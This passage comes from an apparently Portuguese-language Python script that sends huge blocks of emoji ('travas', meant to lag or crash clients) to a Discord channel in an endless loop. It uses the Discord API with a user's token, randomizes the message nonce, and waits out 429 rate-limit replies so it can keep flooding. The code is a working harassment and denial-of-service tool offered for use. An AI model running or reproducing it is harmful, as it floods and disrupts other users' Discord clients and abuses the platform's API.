🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌🐠🦧🐯🎃🐌**',
                    'nonce': f'7707895532{n1}{n6}{n5}{n4}{n3}3{n}{n2}',
                    'tts': 'false'}

                    r = requests.post(f'https://discord.com/api/v8/channels/{uID}/messages', headers=headers, json=payload2)
                    if r.status_code == 200:
                        print('Enviando...Travas')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui 7 segundos!!')
                        time.sleep(7)
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                        input('\n     Pressione ENTER Para Fechar!!')
                        exit()
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
                    input('\n     Pressione ENTER Para Fechar!!')
                    exit()
            time.sleep(0.5)
            os.system('color')
            time.sleep(0.5)
## Comando da linha [3]         
        elif op == '3':
            while True:
                try:
                    n = random.choice(nn)
                    n1 = random.choice(nn)
                    n2 = random.choice(nn)
                    n3 = random.choice(nn)
                    n4 = random.choice(nn)
                    n5 = random.choice(nn)
                    n6 = random.choice(nn)
                    payload3 = {'content':'**🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷**',
                    'nonce': f'7707895532{n1}{n6}{n5}{n4}{n3}3{n}{n2}',
                    'tts': 'false'}

                    r = requests.post(f'https://discord.com/api/v8/channels/{uID}/messages', headers=headers, json=payload3)
                    if r.status_code == 200:
                        print('Enviando...Travas')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui 7 segundos!!')
                        time.sleep(7)
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                        input('\nPressione ENTER Para Fechar!!')
                        exit()
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
                    input('\nPressione ENTER Para Fechar!!')
                    exit()
            time.sleep(0.5)
            os.system('color')
            time.sleep(0.5)

        else:
           os.system("color 4")
           print('\n\nDIGITE APENAS 1, 2 OU 3!')
           input('\nPressione ENTER Para Fechar!!')
           exit() 
    else:
        os.system("color 4")
        print('\n\nDIGITE APENAS 1 OU 2!')
        input('\n Pressione ENTER Para Fechar!!')
        exit()
except KeyboardInterrupt:
    os.system('cls')
    print(logo)
    print('Até Mais!! ^^')
    time.sleep(2.5)
    exit()
## Comando do Menu  [4]